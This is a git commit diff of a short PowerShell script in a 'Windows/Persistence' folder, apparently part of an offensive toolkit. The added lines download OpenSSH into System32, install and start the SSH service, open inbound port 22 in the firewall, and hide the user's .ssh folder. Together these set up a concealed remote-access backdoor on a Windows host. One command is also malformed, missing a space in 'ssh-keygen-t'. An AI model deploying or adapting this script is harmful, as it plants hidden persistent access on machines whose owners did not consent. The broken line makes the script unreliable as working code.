ca09feace372f90d673e947d704c809e24218eae
megatop1 <43348736+megatop1@users.noreply.github.com>
2021-12-14 20:43:39 -0500

    Update DeploySSH.ps1

--- Windows/Persistence/DeploySSH.ps1
+++ Windows/Persistence/DeploySSH.ps1
@@ -1,5 +1,8 @@
- Invoke-WebRequest -URI  https://github.com/PowerShell/Win32-OpenSSH/releases/download/V8.6.0.0p1-Beta/OpenSSH-Win64.zip
- cd "C:\Program Files\OpenSSH-Win64"
- .\install-sshd.ps1
- .\ssh-keygen.exe -t rsa -b 2048
- Start-Service -name sshd
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -URI https://github.com/PowerShell/Win32-OpenSSH/releases/download/V8.6.0.0p1-Beta/OpenSSH-Win64.zip -Outfile C:\Windows\System32\OpenSSH-Win64.zip
+[Io.Compression.ZipFile]::ExtractToDirectory("C:\Windows\System32\OpenSSH-Win64.zip", "C:\Windows\System32")
+C:\Windows\System32\OpenSSH-Win64\install-sshd.ps1
+C:\Windows\System32\OpenSSH-Win64\ssh-keygen-t rsa -b 2048
+Start-Service -Name sshd
+netsh advfirewall firewall add rule name="SSH" dir=in action=allow protocol=TCP localport=22
+attrib +h C:\Users\<user>\.ssh
